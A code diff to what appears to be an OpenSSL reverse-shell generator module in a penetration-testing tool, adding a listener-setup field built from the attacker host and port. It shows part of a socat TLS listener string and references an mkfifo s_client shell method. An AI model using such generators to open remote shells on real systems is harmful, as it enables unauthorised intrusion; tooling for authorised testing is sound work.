@@ -1,5 +1,6 @@
 import random
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler
+from dataclasses import replace
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, build_listener_setup
 
 _SHELL_PATHS = ["/bin/bash", "/bin/sh"]
 
@@ -37,6 +38,8 @@ class OpenSSLGenerator(ShellGenerator):
                 f"cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0 FILE:`tty`,raw,echo=0"
             )
 
+        ls = replace(build_listener_setup(opts.lhost, opts.lport), tls=listener)
+
         return ShellResult(
             command=cmd,
             variant=variant,
@@ -45,6 +48,7 @@ class OpenSSLGenerator(ShellGenerator):
             listener=listener,
             tty_upgrade=TTY_UPGRADE,
             msf_compat=_MSF_NOTE,
+            listener_setup=ls,
         )
 
     def _mkfifo_sclient(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
